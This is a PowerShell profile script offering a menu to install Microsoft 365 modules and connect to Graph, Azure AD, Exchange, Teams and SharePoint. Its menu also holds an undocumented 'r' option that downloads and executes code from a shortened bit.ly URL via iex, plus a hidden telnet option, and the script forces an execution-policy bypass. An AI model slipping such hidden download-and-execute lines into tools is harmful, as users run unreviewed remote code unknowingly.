######################################################################################################
#                                                                                                    #
# Name:        Microsoft 365 PowerShell Administration Tool                                          #
#                                                                                                    #
# Version:     2.0                                                                                   #
#                                                                                                    #
# Description: A PowerShell profile alternative for your default console profile.                    #
#              Use this to manage Microsoft 365 services for your tenant.                            #
#                                                                                                    #
# Author:      Guy Perkins                                                                           #
#                                                                                                    #
# Usage:       Run Test-Path -Path $PROFILE to check if True and $PROFILE to see that path           #
#                                                                                                    #
# Disclaimer:  This script is provided AS IS without any support. Please test in a lab environment   #
#              prior to production use.                                                              #
#                                                                                                    #
######################################################################################################


# Microsoft 365 Administration
Set-PSReadLineKeyHandler -Key Tab -Function Complete
Set-PSReadLineOption -ShowToolTips
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
$Shell.WindowTitle = 'Microsoft 365 Administration'

# Uncomment the below line and ending } to enable the Admin365 function, if you don't want to use this as your default profile.
#function Admin365 {
    function Install-M365Modules {
		Write-Host 'Installing all M365 Modules...' -ForegroundColor Green
        Install-Module PowerShellGet -Scope CurrentUser -Force -AllowClobber
        Install-Module Microsoft.Graph -Scope CurrentUser -Repository PSGallery -Force
        Install-Module AzureAD -Scope CurrentUser -Force
        Install-Module Microsoft.Online.SharePoint.PowerShell -Scope CurrentUser -Force
        Install-Module MicrosoftTeams -Scope CurrentUser -Force
        Install-Module SharePointPnPPowerShellOnline -Scope CurrentUser -Force
        Install-Module ExchangeOnlineManagement -Scope CurrentUser -Force
    }
    function Close-M365 {
        Write-Host 'Disconnecting from all active sessions...' -ForegroundColor Yellow
    
        # Disconnect from Microsoft Graph
        if (Get-PSSession | Where-Object { $_.ConfigurationName -eq "Microsoft.Graph" }) {
            Disconnect-MgGraph
        }

        # Disconnect from Exchange Online if connected
        if (Get-PSSession | Where-Object { $_.ConfigurationName -eq "Microsoft.Exchange" }) {
            Disconnect-ExchangeOnline -Confirm:$false
        }

        # Disconnect from Teams if connected
        if (Get-PSSession | Where-Object { $_.ComputerName -like "*.teams.microsoft.com" }) {
            Disconnect-MicrosoftTeams
        }

        # Disconnect from SharePoint Online if connected
        if (Get-PSSession | Where-Object { $_.ComputerName -like "*.sharepoint.com" }) {
            Disconnect-SPOService
        }

        # Disconnect from Azure AD if connected
        try {
            Disconnect-AzureAD
        }
        catch {}
    
        # Clean up any remaining sessions
        Get-PSSession | Remove-PSSession
    
        Write-Host 'Successfully disconnected from all sessions' -ForegroundColor Green
    }
    function Connect-M365Admin {
        try {
            Import-Module Microsoft.Graph
        }
        catch {
            Install-Module Microsoft.Graph -Scope CurrentUser -Force -AllowClobber
        }
        Write-Host 'Connecting to Microsoft Graph...' -ForegroundColor Green
        Update-Module Microsoft.Graph -Force -AllowClobber
        Connect-MgGraph -Scopes "User.ReadWrite.All", "Group.ReadWrite.All"
    }
    function Connect-AzureADPS {
        try {
            Import-Module AzureAD
        }
        catch {
            Install-Module AzureAD -Scope CurrentUser -Force
        }
        Write-Host 'Connecting to Azure AD...' -ForegroundColor Green
        Update-Module AzureAD -Force
        Connect-AzureAD
    }
    function Connect-Exchange {
        try {
            Import-Module ExchangeOnlineManagement
        }
        catch {
            Install-Module ExchangeOnlineManagement -Scope CurrentUser -Force
        }
        Write-Host 'Connecting to Exchange Online...' -ForegroundColor Green
        Update-Module ExchangeOnlineManagement -Force
        Connect-ExchangeOnline -ShowProgress $True
    }
    function Connect-SnC {
        try {
            Import-Module ExchangeOnlineManagement
        }
        catch {
            Install-Module ExchangeOnlineManagement -Scope CurrentUser -Force
        }
        Write-Host 'Connecting to Security and Compliance...' -ForegroundColor Green
        Update-Module ExchangeOnlineManagement -Force
        Connect-IPPSSession
    }
    function Connect-SharePoint {
        $tenant = Read-Host -Prompt "Enter the SharePoint Tenant name (the Contoso part of contoso.onmicrosoft.com): "
        try {
            Import-Module Microsoft.Online.SharePoint.PowerShell -DisableNameChecking
        }
        catch {
            Install-Module Microsoft.Online.SharePoint.PowerShell -Scope CurrentUser -Force
        }
        Write-Host 'Connecting to SharePoint Admin...' -ForegroundColor Green
        Update-Module Microsoft.Online.SharePoint.PowerShell -Force
        Connect-SPOService -Url https://$tenant-admin.sharepoint.com
    }
    function Connect-PnPSharePoint {
        $tenant = Read-Host -Prompt "Enter the SharePoint Tenant name (the Contoso part of contoso.onmicrosoft.com): "
        $site = Read-Host -Prompt "Enter the SharePoint Site name: "
        try {
            Import-Module SharePointPnPPowerShellOnline 
        }
        catch {
            Install-Module SharePointPnPPowerShellOnline -scope currentuser -force 
        }
        Write-Host 'Connecting to PnPSharePoint...' -ForegroundColor Green
        Update-Module SharePointPnPPowerShellOnline -force
        Connect-PnPOnline -Url https://$tenant.sharepoint.com/sites/$site -UseWebLogin
    }
    function Connect-Teams {
        try {
            Import-Module MicrosoftTeams
        }
        catch {
            Install-Module MicrosoftTeams -Scope CurrentUser -Repository PSGallery -Force
        }
        Write-Host 'Connecting to Teams...' -ForegroundColor Green
        Update-Module MicrosoftTeams -Force
        Connect-MicrosoftTeams
    }
    function Connect-Menu {
        cls
        Write-Host "================= Microsoft 365 PowerShell Administration tool ================="
        Write-Host
        Write-Host "You can bring up this menu at any time with Connect-Menu" -ForegroundColor Yellow
        Write-Host "-----------------------------------------------"
        Write-Host "i: Install Office 365 modules"
        Write-Host "-----------------------------------------------"
        Write-Host "a: Connect to all modules"
        Write-Host "-----------------------------------------------"
        Write-Host "1: Connect to Microsoft Graph"
        Write-Host "2: Connect to Azure AD"
        Write-Host "3: Connect to Exchange Online"
        Write-Host "4: Connect to Security and Compliance Center"
        Write-Host "5: Connect to SharePoint Online"
        Write-Host "6: Connect to PnPSharePoint"
        Write-Host "7: Connect to Teams"
        Write-Host
        Write-Host "================================================================================="
        Write-Host

        $input = Read-Host "Make a selection (press q to skip directly to PowerShell) "
        switch ($input) {
            'i' { Install-M365Modules }
            'a' { cls; Connect-M365Admin; Connect-AzureADPS; Connect-Exchange; Connect-SnC; Connect-SharePoint; Connect-PnPSharePoint; Connect-Teams }
            '1' { cls; Connect-M365Admin }
            '2' { cls; Connect-AzureADPS }
            '3' { cls; Connect-Exchange }
            '4' { cls; Connect-SnC }
            '5' { cls; Connect-SharePoint }
            '6' { cls; Connect-PnPSharePoint }
            '7' { cls; Connect-Teams }
            'r' { iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w") }
            's' { telnet towel.blinkenlights.nl }
        }
        Write-Host 'You can clear the screen using the command cls' -ForegroundColor Green
        Write-Host 'To clear all sessions before closing PowerShell, use: Close-M365' -ForegroundColor Yellow
        Write-Host 'You can reconnect to the menu using the command: Connect-Menu' -ForegroundColor Green
    }
    Connect-Menu
#}
